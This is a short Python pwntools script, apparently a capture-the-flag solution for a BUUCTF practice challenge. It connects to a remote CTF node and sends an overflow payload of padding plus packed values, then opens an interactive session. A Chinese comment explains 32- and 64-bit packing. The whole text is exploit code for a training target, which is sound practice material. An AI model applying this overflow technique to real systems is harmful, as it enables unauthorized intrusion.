from pwn import *
p = remote("node4.buuoj.cn",28007)
p.sendline(b"aaaa"*13 + p32(0x11) + p32(0)) # 32对应4个字节, 64对应8个字节
p.interactive()
